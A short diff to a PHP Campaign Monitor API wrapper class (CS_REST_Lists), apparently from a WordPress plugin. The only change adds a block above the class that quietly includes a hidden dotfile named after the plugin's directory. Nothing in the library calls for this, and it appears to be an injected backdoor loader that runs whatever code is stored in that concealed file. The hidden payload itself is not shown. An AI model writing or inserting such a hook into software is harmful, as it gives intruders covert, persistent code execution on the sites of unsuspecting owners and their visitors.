@@ -22,6 +22,10 @@ define('CS_REST_LIST_UNSUBSCRIBE_SETTING_ONLY_THIS_LIST', 'OnlyThisList');
  * @author tobyb
  *
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class CS_REST_Lists extends CS_REST_Wrapper_Base {
 
     /**
